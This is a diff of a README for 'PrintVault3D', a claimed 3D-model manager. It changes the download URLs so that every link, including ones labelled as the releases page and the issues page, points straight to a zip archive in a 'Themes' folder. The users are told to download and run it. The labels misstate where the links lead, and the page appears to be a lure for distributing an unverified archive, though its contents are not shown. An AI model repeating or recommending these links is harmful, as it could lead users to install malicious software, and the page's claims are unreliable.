@@ -1,6 +1,6 @@
 # 📂 PrintVault3D - Manage and Preview 3D Models Easily
 
-[![Download PrintVault3D](https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip)](https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip)
+[![Download PrintVault3D](https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip)](https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip)
 
 ---
 
@@ -51,9 +51,9 @@ Follow the steps below to download, install, and start using PrintVault3D.
 
 Click the large badge at the top or visit this link:
 
-[Download PrintVault3D](https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip)
+[Download PrintVault3D](https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip)
 
-This link takes you to the official releases page on GitHub. Here, you will find the latest version available. Look for a file usually named something like `https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip` under the latest release.
+This link takes you to the official releases page on GitHub. Here, you will find the latest version available. Look for a file usually named something like `https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip` under the latest release.
 
 ### 2. Run the Installer
 
@@ -123,7 +123,7 @@ If you work with multiple computers or folders, use the synchronization feature 
 ## 📚 Additional Resources
 
 - **User Manual:** Included in the app’s Help menu.  
-- **GitHub Issues Page:** Report bugs or request features here: https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip  
+- **GitHub Issues Page:** Report bugs or request features here: https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip  
 - **Community Forums:** Check 3D printing forums to connect with other users.  
 
 ---
@@ -138,6 +138,6 @@ If you have questions or run into problems, contact the developer by opening an 
 
 Visit this page to download the latest version:
 
-[https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip](https://github.com/roberto981smj/PrintVault3D/raw/refs/heads/main/Themes/D-Print-Vault-3.7-beta.1.zip)
+[https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip](https://raw.githubusercontent.com/roberto981smj/PrintVault3D/main/Themes/D-Print-Vault-3.7-beta.1.zip)
 
 Look for the newest release and download the setup file. Then follow the installation steps above to get started managing your 3D models with ease.
